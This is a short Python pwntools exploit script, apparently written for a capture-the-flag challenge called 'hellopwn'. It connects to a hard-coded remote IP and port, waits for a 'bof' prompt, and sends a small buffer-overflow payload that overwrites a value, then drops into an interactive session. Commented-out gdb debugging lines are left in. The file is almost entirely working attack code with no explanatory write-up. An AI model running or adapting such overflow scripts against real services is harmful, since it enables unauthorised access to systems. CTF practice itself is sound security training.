#!/usr/bin/env python
# coding: utf-8

from pwn import *

if len(sys.argv) == 1:
    DEBUG = 1
else:
    DEBUG = 0


r      = lambda x: p.recv(x)
ru     = lambda x: p.recvuntil(x)
rud    = lambda x: p.recvuntil(x, drop=True)
se     = lambda x: p.send(x)
sel    = lambda x: p.sendline(x)
pick32 = lambda x: u32(x[:4].ljust(4, '\0'))
pick64 = lambda x: u64(x[:8].ljust(8, '\0'))

if DEBUG:
    
    context.terminal = ['tmux','splitw','-h']
    context.log_level = 'debug'
    #p = process('./hellopwn')
   # libc = ELF("./libc-2.23.so")

    p = remote("111.198.29.45", 32201, timeout=3)
    print("123")
   #gdb.attach(p,"""
#	  b *0x80486cb
#	  c
#	 """)
 
    ru("bof")
    print "11111"
    payload="A"*4+"aaun\0"
    #gdb.attach(p,"b *0x400686")
    #pause()
    sel(payload)#   ru("you!")
    #ru("Name?")
    #payload="AAAAAAAA"+p64(1926)
    #gdb.attach(p)
    #pause()
    print "over"
 

    p.interactive()


